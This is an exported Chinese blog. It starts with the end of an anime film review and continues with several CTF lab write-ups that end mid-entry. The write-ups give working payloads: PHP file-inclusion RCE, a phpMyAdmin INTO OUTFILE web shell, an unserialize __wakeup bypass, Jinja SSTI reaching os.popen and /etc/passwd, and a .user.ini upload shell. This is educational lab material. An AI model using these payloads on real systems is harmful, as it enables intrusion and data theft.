<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
]]></content>
      <categories>
        <category>动画</category>
        <category>搖曳露营</category>
      </categories>
      <tags>
        <tag>动画</tag>
        <tag>搖曳露营</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-Web_php_include</title>
    <url>/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基础题，多种解法。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>strstr()函数<br>查找字符串的首次出现<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strstr(string $haystack, string $needle, bool $before_needle = false): string|fal</span><br><span class="line">返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。</span><br><span class="line">注意:</span><br><span class="line">该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>根据源码可知，我们可以传入两个参数hello,page<br>并且过滤了 <code>php://</code><br>虽然函数定义上区分大小写，但本关中使用大小写绕过并不能成功，于是我们可以换成data:</p>
<ol start="2">
<li>构造payload<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;ls&#x27;)?&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>system()函数<br>执行外部程序，并且显示输出<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(string $command, int &amp;$result_code = null): string|false</span><br><span class="line">同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。</span><br><span class="line"></span><br><span class="line">如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</span><br><span class="line"></span><br><span class="line">如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</span><br></pre></td></tr></table></figure></li>
<li>ls命令<br>ls命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。</li>
</ul>
<p>因此该payload可以得到我们所需的文件：fl4gisisish3r3.php<br>之后再次构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
<p>由此，可以在源码中拿到flag</p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>通过扫描后台工具发现phpmyadmin后台<br>打开该后台,进入登录页面：<br><code>http://61.147.171.105:49265/phpmyadmin</code><br>username:root, password为空<br>之后进入SQL语句输入的地方，编辑一句话木马并执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/tmp/123.php&#x27;</span><br></pre></td></tr></table></figure>
<p>使用 SELECT … INTO OUTFILE 语句导出数据到相应文件中。<br>打开蚁剑，url地址输入：<br><code>http://61.147.171.105:49265/?page=/tmp/123.php</code><br>密码为cmd<br>连接成功后，在www目录下找到fl4gisisish3r3.php<br>打开拿到flag</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有些方法可以使用，这里不再列举，可以看看攻防世界的wp。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-Web_php_unserialize</title>
    <url>/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没注意到细节会吃亏。</p>
<span id="more"></span>
<h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由源码可知需要绕过魔法函数 <code>__wakeup()</code> ，只需要变量参数数量大于实际数量就可以了。<br>preg_match()函数那里直接用加号绕过，比如: <code>O:4</code> 改为 <code>O:+4</code><br>还需要进行base64加密，需要在脚本中加密才行。<br>因为这里有个坑，这里的 file 变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大 2，如果将序列化结果复制到在线的 base64 网站进行编码可能就会丢掉空白字符，所以这里直接在php 代码里进行编码。类似的还有 protected 类型的变量，序列化之后字符串首部会加上%00*%00</p>
<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先根据源码写一个简洁脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);      <span class="comment">//绕过正则表达式过滤</span></span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>); 		<span class="comment">//wakeup绕过</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$C</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的base64编码构造payload即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-Web_python_template_injection</title>
    <url>/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_python_template_injection/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSTI注入是一种不算陌生的漏洞。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p> 首先看到题目，就知道这道题是关于 <strong>模板注入</strong> 的，什么是模板注入呢？</p>
<ul>
<li>为了写 html 代码的时候方便，很多网站都会使用模板，先写好一个 html 模板文件，<br>比如：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%(code)</span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></li>
</ul>
<p> 这段代码中的 <code>html</code> 就是一个简单的模板文件，当开发者想要这个模板对应的样式时，可以直接用 <code>render_template_string</code> 方法来调用这个模板，从而直接把这个样式渲染出来。<br>而模板注入，就是指 <strong>将一串指令代替变量传入模板中让它执行</strong> ，以这段代码为例，我们在传入 <code>code</code> 值时，可以用 <code>&#123;&#123;&#125;&#125;</code> 符号来包裹一系列代码，以此替代本应是参数的 <code>id</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://..../?id=&#123;&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>知道了什么是模板文件，接下来开始模板注入环节:<br>首先，先测试一下是不是确实能注入，构造一个简单的测试 url:<br><code>http://111.198.29.45:46675/&#123;&#123;7*7&#125;&#125;</code> 服务器回传：<br><code>URL http://111.198.29.45:46675/49 not found</code><br><code>/49</code> 的存在说明 <code>7*7</code> 这条指令被忠实地执行了。<br>接下来，开始想办法编代码拿到服务器的控制台权限：</li>
<li>首先，题目告诉我们这是一个 python 注入问题，那么脚本肯定也是 python 的，思考怎样用 python 语句获取控制台权限：想到了 <code>os.system</code> 和 <code>os.popen</code> (<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>), 这两句前者返回 <strong>退出状态码</strong> , 后者 <strong>以 file 形式</strong> 返回 <strong>输出内容</strong>, 我们想要的是内容，所所以选择 <code>os.popen</code> 。</li>
<li>知道了要用这一句，那么我要怎么找到这一句呢？python 给我们提供了完整的寻找链(<a href="https://www.cnblogs.com/tr1ple/p/9415641.html">参考资料</a>)：</li>
<li><code>__class__</code> ： 返回对象所属的类<br><code>__mro__</code> ： 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br><code>__base__</code> ： 返回该类所继承的基类<br>&#x2F;&#x2F; <code>__base__</code> 和 <code>__mro__</code> 都是用来寻找基类的<br><code>__subclasses__</code> ： 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__init__</code> ： 类的初始化方法<br><code>__globals__</code> ： 对包含函数全局变量的字典的引用</li>
<li>首先，找到当前变量所在的类：<br><code>111.198.29.45:46675/%7B%7B&#39;&#39;.__class__%7D%7D</code> 服务器回复：<br><code>URL http://111.198.29.45:46675/&lt;type &#39;str&#39;&gt; not found</code> 发现这个回复里已经告诉我们 这个变量的类是 ‘str’ 了。</li>
<li>接下来，从这个类找到它的基类：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__%7D%7D</code> 服务器回复：<br><code>URL http://111.198.29.45:46675/(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;) not found</code> 发现基类也有了。</li>
<li>然后，通过基类来找其中任意一个基类的引用列表：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()%7D%7D</code> 这里有个小细节，<code>__mro__[]</code> 中括号里填谁其实区别都不大，这些基类引用的东西都一样。<br>服务器回复了很长的一个列表，我就不列举了，从其中可以找到我们想要的 <code>os</code> 所在的 <code>site._Printer</code> 类，它在列表的第七十二位，<br>即 <code>__subclasses__()[71]</code> 。</li>
<li>通过 <code>__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;命令行语句&#39;).read()</code> 来 <strong>调用服务器的控制台</strong> <strong>并显示</strong> ，这下我们就可以随便用控制台输出了。<br>直接填命令语句：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()%7D%7D</code> 注意这里的 <code>popen(&#39;ls&#39;).read()</code> ,意思是 <strong>得到 ls 的结果并读取给变量</strong> ，因此它会把当前目录所有文件都打印在我们的网页上，内容如下：<br><code>URL http://111.198.29.45:46675/fl4g index.py not found</code> 从这里我们看到，flag 存在一个叫 <code>fl4g</code> 的无后缀文件里，那就好办了，再<br>构造一个 payload，用 <code>cat</code> 读一下内容：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read()%7D%7D</code><br>服务器回复：<br><code>URL http://111.198.29.45:46675/ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125; not found</code><br>成功拿到flag</li>
</ul>
<h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><ul>
<li>&#96;&#96;&#96;python<br>‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[71].<strong>init</strong>.<strong>globals</strong>[‘os’].popen(‘cat fl4g’).read()<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以上 payload 是一个非常常用的 payload，同样常用的还有</span><br><span class="line">```python</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
和<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-easyupload</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是打了一点靶场，完全不够，知识还多着呢！</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>尝试<br>首先进行多种尝试，修改php文件名后缀的方法几乎都试过了，无法上传成功。<br>图片木马多次尝试也无法成功。那么只能只能换一种思路。<br>几经波折后，我们发现了几个重要的点：</li>
</ol>
<ul>
<li>如果文件中含有php，那么无法上传成功，所以必须选择没有php的方式。这里可以使用短标签绕过。</li>
<li>即便上传了也无法连接蚁剑。那么我们可以选择尝试.user.ini</li>
</ul>
<p>这里涉及到几个知识：</p>
<ul>
<li><p>短标签<br>通常情况下输出我们会这样写：<br><code>&lt;?php echo &quot;hello&quot;; ?&gt;</code><br>但其实我们可以简写为: <code>&lt;?= &quot;hello&quot;;?&gt;</code></p>
</li>
<li><p>PHP REQUEST</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 中提供了一个 $_REQUEST 全局变量，它是一个包含了 $_POST、$_GET 和 $_COOKIE 的数组，</span><br><span class="line">数组结构与 $_POST 和 $_GET 类似。</span><br><span class="line">也就是说不管是使用 POST 还是使用 GET 方式提交的数据，都可以使用 $_REQUEST 来获取，</span><br><span class="line">甚至可以使用 $_REQUEST 来获取 COOKIE 的信息。在 PHP5.3 中引入 request_order 属性，</span><br><span class="line">我们可以通过在 php.ini 配置文件中修改 request_order 属性的值，来控制 $_REQUEST 中包含的内容。</span><br></pre></td></tr></table></figure>
</li>
<li><p>.user.ini<br>.user.ini:它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br><code>auto_prepend_file=123.gif</code><br>其中123.gif是需要包含的文件，借此我们可以包含任意文件。<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">更详细的解释</a></p>
</li>
<li><p>GIF89a<br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>示例：<br>在记事本下写下该内容，后缀保存为图片</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span> = <span class="string">&quot;refresh&quot;</span> <span class="attr">content</span> = <span class="string">&quot;1; url=http://www.***.com/&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当单独查看此文件时，会出现GIF89a，然后跳转到指定的网页（ie6和ie7下，Firefox下不可以）<br>php下检测（使用getimagesize函数无法判断其图片是无效的）</p>
</li>
</ul>
<ol start="2">
<li><p>构造条件<br>涉及的知识都清楚后，我们先创建一个.user.ini文件，文件内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=c.jpg</span><br></pre></td></tr></table></figure>
<p>创建一个c.txt文件，文件内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后将其后缀改为jpg</p>
</li>
<li><p>抓包修改<br>首先上传.user.ini文件，抓包<br>得到的包将里面的Content-Type改为image&#x2F;jpeg,放包<br>页面应显示： <code>file upload successful, the path is: uploads/.user.ini</code><br>然后上传c.jpg<br>页面应显示： <code>file upload successful, the path is: uploads/c.jpg</code><br>上传成功后便可进行下一步。</p>
</li>
<li><p>蚁剑连接<br>接下来我们打开F12，从Network处查看我们上传的文件地址：<br><code>http://61.147.171.105:56641/uploads/index.php</code><br>找到文件地址后，打开蚁剑连接<br>url地址填写上面的文件地址，连接密码则填写cmd<br>等待几秒，测试连接，一般会显示连接成功。<br>然后添加数据，等待几秒后，右键 文件管理。（有时蚁剑会出小问题，多尝试几次即可）<br>如果没有几个文件，删除重来。如果有很多文件，那么就可以从中找到我们所需的flag</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>慢慢来，不要忽略细节。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_56426046/article/details/126563269">攻防世界ctf题目easyupload做题笔记</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>upload</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-baby_web</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
</li>
<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-file_include</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>明显是文件包含，get型传参</p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先按照标准的获取文件内容方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure>
<p>执行后发现显示：do not hack!<br>这是配置了WAF，于是我们需要弄清楚哪里被过滤并且寻找绕过方式。</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>我们可以尝试在各个字段中添加1来破坏完整性，通过在ba1se64-en1code我们可知是base64和encode被过滤了。<br>于是需要想办法绕过base64和encode来达到目的。</p>
